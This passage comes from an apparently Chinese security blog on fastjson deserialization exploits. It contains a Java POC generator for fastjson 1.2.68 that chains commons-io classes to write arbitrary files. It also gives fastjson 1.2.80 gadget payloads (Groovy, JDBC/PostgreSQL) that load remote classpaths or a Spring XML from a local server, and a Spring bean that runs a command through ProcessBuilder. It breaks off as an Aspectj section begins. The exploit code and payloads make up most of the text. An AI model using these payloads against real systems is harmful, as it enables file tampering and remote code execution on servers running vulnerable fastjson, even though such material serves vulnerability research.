class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * fastjson 1.2.68 autocloseable commons-io poc 生成工具类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> su18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">AUTOCLOSEABLE_TAG</span> <span class="operator">=</span> <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 在 payload 外包裹一层绕过指定类型</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> payload payload</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> 返回结果</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bypassSpecializedClass</span><span class="params">(String payload)</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&#123;\&quot;su18\&quot;:&quot;</span> + payload + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 使用 Currency 类解析调用 &quot;currency&quot; 中 value 的 toString 方法，使用 JSONObject 方法调用 toJSONString</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> payload payload</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> 返回结果</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">useCurrencyTriggerAllGetter</span><span class="params">(String payload, <span class="type">boolean</span> ref)</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> String.format(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.util.Currency\&quot;,\&quot;val\&quot;:&#123;\&quot;currency\&quot;:%s%s&#125;&#125;%s&quot;</span>,</span><br><span class="line">				(ref ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&#123;\&quot;su19\&quot;:&quot;</span>), payload, (ref ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&#125;&quot;</span>));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 生成 CharSequenceInputStream 反序列化字符串</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> content 写入内容</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> ref     是否使用引用对象</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> 返回结果</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateCharSequenceInputStream</span><span class="params">(String content, <span class="type">boolean</span> ref)</span> &#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">mod</span> <span class="operator">=</span> <span class="number">8192</span> - content.length() % <span class="number">8192</span>;</span><br><span class="line"></span><br><span class="line">		<span class="type">StringBuilder</span> <span class="variable">contentBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(content);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mod+<span class="number">1</span>; i++) &#123;</span><br><span class="line">			contentBuilder.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> String.format(<span class="string">&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.input.CharSequenceInputStream\&quot;,&quot;</span> +</span><br><span class="line">						<span class="string">&quot;\&quot;charset\&quot;:\&quot;UTF-8\&quot;,\&quot;bufferSize\&quot;:4,\&quot;s\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.String\&quot;\&quot;%s\&quot;&#125;&quot;</span>,</span><br><span class="line">				ref ? AUTOCLOSEABLE_TAG : <span class="string">&quot;&quot;</span>, contentBuilder);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 生成 FileWriterWithEncoding 反序列化字符串</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> filePath 要写入的文件位置</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> ref      是否使用引用对象</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> 返回结果</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateFileWriterWithEncoding</span><span class="params">(String filePath, <span class="type">boolean</span> ref)</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> String.format(<span class="string">&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.output.FileWriterWithEncoding\&quot;,&quot;</span> +</span><br><span class="line">				<span class="string">&quot;\&quot;file\&quot;:\&quot;%s\&quot;,\&quot;encoding\&quot;:\&quot;UTF-8\&quot;&#125;&quot;</span>, ref ? AUTOCLOSEABLE_TAG : <span class="string">&quot;&quot;</span>, filePath);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 生成 WriterOutputStream 反序列化字符串</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> writer writer 对象反序列化字符串</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> ref    是否使用引用对象</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> 返回结果</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateWriterOutputStream</span><span class="params">(String writer, <span class="type">boolean</span> ref)</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> String.format(<span class="string">&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.output.WriterOutputStream\&quot;,\&quot;writeImmediately\&quot;:true,&quot;</span> +</span><br><span class="line">						<span class="string">&quot;\&quot;bufferSize\&quot;:4,\&quot;charsetName\&quot;:\&quot;UTF-8\&quot;,\&quot;writer\&quot;:%s&#125;&quot;</span>,</span><br><span class="line">				ref ? AUTOCLOSEABLE_TAG : <span class="string">&quot;&quot;</span>, writer);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 生成 TeeInputStream 反序列化字符串</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> inputStream  inputStream 类</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> outputStream outputStream 类</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> ref          是否使用引用对象</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> 返回结果</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateTeeInputStream</span><span class="params">(String inputStream, String outputStream, <span class="type">boolean</span> ref)</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> String.format(<span class="string">&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.input.TeeInputStream\&quot;,\&quot;input\&quot;:%s,&quot;</span> +</span><br><span class="line">				<span class="string">&quot;\&quot;closeBranch\&quot;:true,\&quot;branch\&quot;:%s&#125;&quot;</span>, ref ? AUTOCLOSEABLE_TAG : <span class="string">&quot;&quot;</span>, inputStream, outputStream);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 生成 BOMInputStream 反序列化字符串</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> inputStream inputStream 类</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> size        读取 byte 大小</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> 返回结果</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateBOMInputStream</span><span class="params">(String inputStream, <span class="type">int</span> size)</span> &#123;</span><br><span class="line"></span><br><span class="line">		<span class="type">int</span> <span class="variable">nums</span> <span class="operator">=</span> size / <span class="number">8192</span>;</span><br><span class="line">		<span class="type">int</span> <span class="variable">mod</span>  <span class="operator">=</span> size % <span class="number">8192</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (mod != <span class="number">0</span>) &#123;</span><br><span class="line">			nums = nums + <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="type">StringBuilder</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums * <span class="number">8192</span>; i++) &#123;</span><br><span class="line">			bytes.append(<span class="string">&quot;,0&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> String.format(<span class="string">&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.input.BOMInputStream\&quot;,\&quot;delegate\&quot;:%s,&quot;</span> +</span><br><span class="line">						<span class="string">&quot;\&quot;boms\&quot;:[&#123;\&quot;charsetName\&quot;:\&quot;UTF-8\&quot;,\&quot;bytes\&quot;:[%s]&#125;]&#125;&quot;</span>,</span><br><span class="line">				AUTOCLOSEABLE_TAG, inputStream, bytes);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 读取文件内容字符串</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> file 文件路径</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> 返回字符串</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readFile</span><span class="params">(File file)</span> &#123;</span><br><span class="line">		<span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			result = FileUtils.readFileToString(file);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 生成普通 payload</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> payloadFile    写入文件本地存储位置</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> targetFilePath 写出目标文件位置</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> 返回 payload</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generatePayload</span><span class="params">(String payloadFile, String targetFilePath)</span> &#123;</span><br><span class="line">		<span class="type">File</span>   <span class="variable">file</span>        <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(payloadFile);</span><br><span class="line">		<span class="type">String</span> <span class="variable">fileContent</span> <span class="operator">=</span> readFile(file);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(fileContent)) &#123;</span><br><span class="line">			<span class="keyword">return</span> bypassSpecializedClass(</span><br><span class="line">					useCurrencyTriggerAllGetter(</span><br><span class="line">							generateBOMInputStream(</span><br><span class="line">									generateTeeInputStream(generateCharSequenceInputStream(fileContent, <span class="literal">false</span>),</span><br><span class="line">											generateWriterOutputStream(</span><br><span class="line">													generateFileWriterWithEncoding(targetFilePath, <span class="literal">false</span>),</span><br><span class="line">													<span class="literal">false</span>),</span><br><span class="line">											<span class="literal">false</span>),</span><br><span class="line">									(<span class="type">int</span>) file.length()),</span><br><span class="line">							<span class="literal">false</span>));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 生成引用型 payload</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> payloadFile    写入文件本地存储位置</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> targetFilePath 写出目标文件位置</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> 返回 payload</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateRefPayload</span><span class="params">(String payloadFile, String targetFilePath)</span> &#123;</span><br><span class="line">		<span class="type">File</span>   <span class="variable">file</span>        <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(payloadFile);</span><br><span class="line">		<span class="type">String</span> <span class="variable">fileContent</span> <span class="operator">=</span> readFile(file);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(fileContent)) &#123;</span><br><span class="line">			<span class="keyword">return</span> bypassSpecializedClass(</span><br><span class="line">					useCurrencyTriggerAllGetter(</span><br><span class="line">							<span class="string">&quot;&#123;\&quot;writer\&quot;:&quot;</span> + generateFileWriterWithEncoding(targetFilePath, <span class="literal">true</span>) +</span><br><span class="line">									<span class="string">&quot;,\&quot;outputStream\&quot;:&quot;</span> + generateWriterOutputStream(<span class="string">&quot;&#123;\&quot;$ref\&quot;:\&quot;$.currency.writer\&quot;&#125;&quot;</span>, <span class="literal">true</span>) +</span><br><span class="line">									<span class="string">&quot;,\&quot;charInputStream\&quot;:&quot;</span> + generateCharSequenceInputStream(fileContent, <span class="literal">true</span>) +</span><br><span class="line">									<span class="string">&quot;,\&quot;teeInputStream\&quot;:&quot;</span> + generateTeeInputStream(<span class="string">&quot;&#123;\&quot;$ref\&quot;:\&quot;$.currency.charInputStream\&quot;&#125;&quot;</span>, <span class="string">&quot;&#123;\&quot;$ref\&quot;:\&quot;$.currency.outputStream\&quot;&#125;&quot;</span>, <span class="literal">true</span>) +</span><br><span class="line">									<span class="string">&quot;,\&quot;inputStream\&quot;:&quot;</span> + generateBOMInputStream(<span class="string">&quot;&#123;\&quot;$ref\&quot;:\&quot;$.currency.teeInputStream\&quot;&#125;&quot;</span>, (<span class="type">int</span>) file.length()) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">							, <span class="literal">true</span></span><br><span class="line">					)</span><br><span class="line">			);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		<span class="type">String</span> <span class="variable">file</span>   <span class="operator">=</span> <span class="string">&quot;/Users/phoebe/Downloads/12.txt&quot;</span>;</span><br><span class="line">		<span class="type">String</span> <span class="variable">target</span> <span class="operator">=</span> <span class="string">&quot;/Users/phoebe/Downloads/123.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 正常调用 payload 生成</span></span><br><span class="line">		<span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> generatePayload(file, target);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 引用类型 payload 生成</span></span><br><span class="line">		<span class="type">String</span> <span class="variable">payloadWithRef</span> <span class="operator">=</span> generateRefPayload(file, target);</span><br><span class="line"></span><br><span class="line"><span class="comment">//		以下三种调用方式均可兼容，触发反序列化</span></span><br><span class="line"><span class="comment">//		JSON.parse(payloadWithRef);</span></span><br><span class="line">		JSON.parseObject(payloadWithRef);</span><br><span class="line"><span class="comment">//		JSON.parseObject(payloadWithRef,POC.class);</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-80"><a href="#fastjson-1-2-80" class="headerlink" title="fastjson 1.2.80"></a>fastjson 1.2.80</h3><blockquote>
<p><font style="color:#000000;">fastjson &lt;&#x3D; 1.2.80，依旧还是利用期望类，可在特定条件下绕过AutoType关闭限制加载远程对象进行反序列化。</font></p>
</blockquote>
<p><font style="color:#000000;">与fastjson 1.2.68一样，该版本的漏洞利用，依旧还是利用的期望类，在1.2.68版本中，主要是使用expectClass中的AutoCloseable进行文件读写操作，而在1.2.80版本中，利用的期望类为Throwable.class。</font></p>
<h4 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span>,</span><br><span class="line">    <span class="string">&quot;unit&quot;</span>:&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span>,</span><br><span class="line">    <span class="string">&quot;config&quot;</span>:&#123;</span><br><span class="line">     <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span>,</span><br><span class="line">     <span class="string">&quot;classpathList&quot;</span>:<span class="string">&quot;http://127.0.0.1:9999/&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.python.antlr.ParseException&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>:&#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.python.core.PyObject&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.ziclix.python.sql.PyConnection&quot;</span>,</span><br><span class="line">        <span class="string">&quot;connection&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.postgresql.jdbc.PgConnection&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostSpecs&quot;</span>:[</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;host&quot;</span>:<span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;port&quot;</span>:<span class="number">2333</span></span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;user&quot;</span>:<span class="string">&quot;user&quot;</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span>:<span class="string">&quot;test&quot;</span>,</span><br><span class="line">            <span class="string">&quot;info&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;socketFactory&quot;</span>:<span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>,</span><br><span class="line">                <span class="string">&quot;socketFactoryArg&quot;</span>:<span class="string">&quot;http://127.0.0.1:8090/exp.xml&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;url&quot;</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">  http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">list</span> <span class="attr">value-type</span>=<span class="string">&quot;java.lang.String&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>/c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;pb.start()&#125;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="Aspectj"><a href="#Aspectj" class="headerlink" title="Aspectj"></a>Aspectj</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一次</span></span><br><span 